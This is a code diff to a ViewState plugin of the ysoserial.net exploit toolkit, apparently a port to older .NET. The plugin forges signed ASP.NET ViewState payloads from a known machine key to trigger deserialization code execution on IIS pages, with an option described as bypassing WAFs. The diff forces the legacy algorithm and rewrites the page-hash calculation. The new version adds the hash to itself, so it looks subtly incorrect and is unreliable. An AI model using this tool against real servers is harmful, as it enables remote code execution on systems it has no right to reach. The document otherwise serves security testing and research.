@@ -32,7 +32,7 @@ namespace ysoserial_frmv2.Plugins
         static string cmd = "";
         static string unsignedPayload = "";
 
-        static bool isLegacy = false;
+        static bool isLegacy = true;
         static string viewstateGenerator = "";
         static string targetPagePath = "";
         static string IISAppInPathOrVirtualDir = "";
@@ -60,7 +60,7 @@ namespace ysoserial_frmv2.Plugins
                 { "generator=", "the __VIEWSTATEGENERATOR value which is in HEX, useful for .NET <= 4.0. When not empty, 'legacy' will be used and 'path' and 'apppath' will be ignored.", v => viewstateGenerator = v},
                 {"path=", "the target web page. example: /app/folder1/page.aspx", v => targetPagePath = v},
                 {"apppath=", "the application path. this is needed in order to simulate TemplateSourceDirectory", v => IISAppInPathOrVirtualDir = v},
-                {"islegacy", "when provided, it uses the legacy algorithm suitable for .NET 4.0 and below", v => isLegacy = v != null},
+                //{"islegacy", "when provided, it uses the legacy algorithm suitable for .NET 4.0 and below", v => isLegacy = v != null}, // ALWAYS LEGACY in this version
                 {"isencrypted", "this will be used when the legacy algorithm is used to bypass WAFs", v => isEncrypted = v!= null},
                 {"viewstateuserkey=", "this to set the ViewStateUserKey parameter that sometimes used as the anti-CSRF token", v => viewStateUserKey = v},
                 {"decryptionalg=", "the encryption algorithm can be set to  DES, 3DES, AES. Default: AES", v => decryptionAlg = v},
@@ -200,8 +200,10 @@ namespace ysoserial_frmv2.Plugins
             object[] emptyArray = new object[] { };
 
             var machineKeySectionType = systemWebAsm.GetType("System.Web.Configuration.MachineKeySection");
-            var getApplicationConfigMethod = machineKeySectionType.GetMethod("GetApplicationConfig", BindingFlags.Static | BindingFlags.NonPublic);
-            var config = (MachineKeySection)getApplicationConfigMethod.Invoke(null, emptyArray);
+            var ensureConfigMethod = machineKeySectionType.GetMethod("EnsureConfig", BindingFlags.Static | BindingFlags.NonPublic);
+            ensureConfigMethod.Invoke(null, emptyArray);
+            var s_config = machineKeySectionType.GetField("s_config", BindingFlags.Static | BindingFlags.NonPublic);
+            var config = (MachineKeySection)s_config.GetValue(null);
             var section = (MachineKeySection)ConfigurationManager.GetSection("system.web/machinekey"); //interesting
             var readOnlyField = typeof(ConfigurationElement).GetField("_bReadOnly", BindingFlags.Instance | BindingFlags.NonPublic);
             readOnlyField.SetValue(config, false);
@@ -221,35 +223,34 @@ namespace ysoserial_frmv2.Plugins
 
             object finalPayload;
 
-            if (isLegacy)
-            {
-                finalPayload = generateViewStateLegacy_2_to_4(targetPagePath, parsedViewstateGeneratorIdentifier, IISAppInPathOrVirtualDir, isEncrypted, viewStateUserKey, payload);
-            }
-            else
-            {
-                finalPayload = generateViewState_4dot5(targetPagePath, IISAppInPathOrVirtualDir, viewStateUserKey, payload);
-            }
+            
+            finalPayload = generateViewStateLegacy_2_to_4(targetPagePath, parsedViewstateGeneratorIdentifier, IISAppInPathOrVirtualDir, isEncrypted, viewStateUserKey, payload);
+            
 
             return finalPayload;
         }
 
         private object generateViewStateLegacy_2_to_4(string targetPagePath, uint parsedViewstateGeneratorIdentifier, string IISAppInPath, bool isEncrypted, string viewStateUserKey, byte[] payload)
         {
+
+            /*
             var stringUtilType = systemWebAsm.GetType("System.Web.Util.StringUtil");
+            
             var nonRandomizedHashCodeMethod = stringUtilType.GetMethod("GetNonRandomizedHashCode", BindingFlags.Static | BindingFlags.NonPublic);
 
             // the pageHashCode is equal to integer conversaion of the "__VIEWSTATEGENERATOR" which is in hex
             // so we don't need to calculate pageHashCode if the "__VIEWSTATEGENERATOR" parameter is known for a page
             // it will be 0 if nothing has been provided. Hopefully there is no page with "__VIEWSTATEGENERATOR == 00000000"!!!
+            */
             uint pageHashCode = parsedViewstateGeneratorIdentifier;
 
             if (pageHashCode == 0)
             {
                 // from GetMacKeyModifier() of System.Web.UI.ObjectStateFormatter
                 // This is where the path is important
-                int pageHashCodeTemp = (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateTemplateSourceDirectory(targetPagePath), true });
-                pageHashCodeTemp += (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateGetTypeName(targetPagePath, IISAppInPath), true });
-                pageHashCode = (uint)pageHashCodeTemp;
+                
+                int pageHashCodeTemp = StringComparer.InvariantCultureIgnoreCase.GetHashCode(targetPagePath);
+                pageHashCodeTemp += pageHashCodeTemp + StringComparer.InvariantCultureIgnoreCase.GetHashCode(simulateGetTypeName(targetPagePath, IISAppInPath)); 
 
                 if (isDebug)
                 {
@@ -262,8 +263,8 @@ namespace ysoserial_frmv2.Plugins
                 // this just for debugging to ensure the __VIEWSTATEGENERATOR matches the calculation
                 // this can also be used to identify the correct path and apppath parameters using trial and error
                 Console.WriteLine("Provided __VIEWSTATEGENERATOR in uint: " + parsedViewstateGeneratorIdentifier);
-                int pageHashCodeTemp = (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateTemplateSourceDirectory(targetPagePath), true });
-                pageHashCodeTemp += (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateGetTypeName(targetPagePath, IISAppInPath), true });
+                int pageHashCodeTemp = StringComparer.InvariantCultureIgnoreCase.GetHashCode(targetPagePath);
+                pageHashCodeTemp += pageHashCodeTemp + StringComparer.InvariantCultureIgnoreCase.GetHashCode(simulateGetTypeName(targetPagePath, IISAppInPath));
                 Console.WriteLine("Calculated pageHashCode in uint (ignored): " + (uint)pageHashCodeTemp);
             }
 
@@ -298,6 +299,7 @@ namespace ysoserial_frmv2.Plugins
             return System.Convert.ToBase64String(byteResult);
         }
 
+        /*
         private object generateViewState_4dot5(string targetPagePath, string IISAppInPath, string viewStateUserKey, byte[] payload)
         {
             var purposeType = systemWebAsm.GetType("System.Web.Security.Cryptography.Purpose");
@@ -337,6 +339,7 @@ namespace ysoserial_frmv2.Plugins
 
             return System.Convert.ToBase64String(byteResult);
         }
+        */
 
         private String simulateTemplateSourceDirectory(String strPath)
         {
